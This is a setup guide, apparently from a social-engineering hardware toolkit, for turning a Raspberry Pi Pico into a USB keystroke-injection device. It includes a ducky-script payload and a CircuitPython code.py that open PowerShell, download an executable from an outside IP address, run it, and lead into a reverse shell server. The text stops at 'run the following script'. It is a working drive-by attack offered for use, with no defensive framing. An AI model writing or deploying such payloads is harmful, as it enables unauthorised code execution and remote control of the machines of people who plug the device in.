# Requirements 

- Raspberry Pi Pico
- Micro usb to usb A adapter
- (optional) [Micro usb to usb A dongle](https://thepihut.com/products/pico-dongle-lite)
- (optional) Bread Board
- (optional) Jumper Wires

# Setup

- To setup the tool connect the pin 1 (GP0) to pin 3 (GND) this will stop pico from injecting the payloads in the current machine
- Download the .uf2 for ur microcontroller
    - [Raspberry Pi pico](https://circuitpython.org/board/raspberry_pi_pico/)
    - [Raspberry Pi pico W](https://circuitpython.org/board/raspberry_pi_pico_w/)
    - [Raspberry Pi pico 2](https://circuitpython.org/board/raspberry_pi_pico2/)
    - [Raspberry Pi pico 2W](https://circuitpython.org/board/raspberry_pi_pico2_w/)
- Plug the pico into the computer, holding the BOOTSEL button. A new drive called "RPI-RP2" should appear.
- Copy the .uf2 into the drive, this should reboot the device and reconnect as CIRCUITPY
- Download [adafruit-circuitpython-bundle-9.x-mpy-YYYYMMDD.zip](https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/)
- Extract the downloaded ZIP file, then navigate to the lib folder. Locate the following specific folders and files, and copy them to the lib folder on your Raspberry Pi Pico
    - adafruit_hid
    - adafruit_debouncer.mpy
    - adafruit_ticks.mpy
    - asyncio
    - adafruit_wsgi
- clone the [pico-ducky](https://github.com/dbisu/pico-ducky) repo and copy the following files to the root of the device
    - boot.py
    - duckyinpython.py
    - code.py
- Finally create a file called payload.dd and write the a [ducky script](https://github.com/hak5/usbrubberducky-payloads)
```
DELAY 5000
GUI R
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\test.exe
```
- In case you dont want to use ducky script its possible to run python as well by editing the code.py file which will run on boot
```
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Create a keyboard object
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

time.sleep(5)  # Wait for 5 seconds after the Pico is plugged in

# Open the Run dialog by pressing Windows key + R
keyboard.press(Keycode.WINDOWS, Keycode.R)  # Windows + R
keyboard.release_all()

time.sleep(0.5)  # Short delay to ensure the Run dialog opens

# open powershell
layout.write("powershell")
keyboard.press(Keycode.ENTER)
keyboard.release_all()

time.sleep(1)  # Wait for Notepad to open

# Now type the message in Notepad
layout.write("Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe")
keyboard.release_all()
```

- Setup the [Reverse Shell Server](https://github.com/tbsauce/social-engineering-hardware-toolkit/blob/main/server/reverseshell.md)

- create a link on the server and run the following script
